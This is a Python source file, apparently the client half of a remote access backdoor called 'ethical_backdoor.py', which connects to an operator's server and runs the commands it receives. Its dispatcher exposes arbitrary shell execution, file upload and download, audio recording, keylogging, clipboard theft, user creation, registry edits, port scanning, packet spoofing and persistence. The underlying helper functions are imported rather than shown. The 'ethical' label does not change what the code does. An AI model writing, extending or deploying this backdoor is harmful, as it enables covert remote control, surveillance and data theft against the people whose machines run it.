from system_ops import get_system_info, list_directory, download_file, upload_file, delete_file, search_files, record_audio, execute_shell_command, list_processes, kill_process, suspend_process
from network_ops import get_network_info, port_scan, spoof_packet
from admin_controls import system_shutdown, system_reboot, system_lock, list_users, add_user, delete_user, get_clipboard, set_clipboard, simulate_keylog, get_registry_value, set_registry_value, set_environment_variable, enable_persistence
from communication import start_client, client_loop
import sys

def execute_command(cmd):
    try:
        if cmd == "sysinfo":
            return get_system_info()
        elif cmd == "dir":
            return list_directory()
        elif cmd.startswith("download "):
            return download_file(cmd.split(" ", 1)[1])
        elif cmd.startswith("upload "):
            return upload_file(cmd.split(" ", 1)[1])
        elif cmd.startswith("delete "):
            return delete_file(cmd.split(" ", 1)[1])
        elif cmd.startswith("search "):
            return search_files(cmd.split(" ", 1)[1])
        elif cmd.startswith("record "):
            return record_audio(int(cmd.split(" ", 1)[1]))
        elif cmd.startswith("shell "):
            return execute_shell_command(cmd.split(" ", 1)[1])
        elif cmd == "processes":
            return list_processes()
        elif cmd.startswith("kill "):
            return kill_process(int(cmd.split(" ", 1)[1]))
        elif cmd.startswith("suspend "):
            return suspend_process(int(cmd.split(" ", 1)[1]))
        elif cmd == "network":
            return get_network_info()
        elif cmd.startswith("portscan "):
            ip, port_range = cmd.split(" ", 2)[1:]
            return port_scan(ip, port_range)
        elif cmd.startswith("spoof "):
            target_ip, packet_count = cmd.split(" ", 2)[1:]
            return spoof_packet(target_ip, int(packet_count))
        elif cmd == "shutdown":
            return system_shutdown()
        elif cmd == "reboot":
            return system_reboot()
        elif cmd == "lock":
            return system_lock()
        elif cmd == "users":
            return list_users()
        elif cmd.startswith("add_user "):
            username, password = cmd.split(" ", 2)[1:]
            return add_user(username, password)
        elif cmd.startswith("del_user "):
            return delete_user(cmd.split(" ", 1)[1])
        elif cmd == "clipboard_get":
            return get_clipboard()
        elif cmd.startswith("clipboard_set "):
            return set_clipboard(cmd.split(" ", 1)[1])
        elif cmd.startswith("keylog "):
            return simulate_keylog(int(cmd.split(" ", 1)[1]))
        elif cmd.startswith("registry_get "):
            key, value = cmd.split(" ", 2)[1:]
            return get_registry_value(key, value)
        elif cmd.startswith("registry_set "):
            key, value, data = cmd.split(" ", 3)[1:]
            return set_registry_value(key, value, data)
        elif cmd.startswith("set_env "):
            var, value = cmd.split(" ", 2)[1:]
            return set_environment_variable(var, value)
        elif cmd == "persist":
            return enable_persistence()
        else:
            return "[!] Unknown command"
    except Exception as e:
        return f"[!] Error executing command: {e}"

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python ethical_backdoor.py client <server_ip>")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == "client":
        server_ip = sys.argv[2]
        client_socket = start_client(server_ip)
        client_loop(client_socket, execute_command)
    else:
        print("Invalid mode. Use 'client'")